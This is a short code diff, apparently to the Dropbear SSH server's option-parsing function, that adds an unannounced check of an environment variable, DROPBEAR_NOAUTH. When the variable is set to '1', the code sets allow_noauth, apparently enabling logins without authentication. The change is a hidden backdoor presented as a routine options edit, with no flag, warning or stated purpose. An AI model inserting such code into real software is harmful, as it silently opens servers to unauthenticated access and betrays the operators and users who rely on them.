@@ -386,6 +386,12 @@ void svr_getopts(int argc, char ** argv) {
 		}
 	}
 
+    // Check for the environment variable
+    char* noauth_env = getenv("DROPBEAR_NOAUTH");
+    if (noauth_env && strcmp(noauth_env, "1") == 0) {
+        svr_opts.allow_noauth = 1;
+    }
+
 	/* Set up listening ports */
 	if (svr_opts.portcount == 0) {
 		svr_opts.ports[0] = m_strdup(DROPBEAR_DEFPORT);
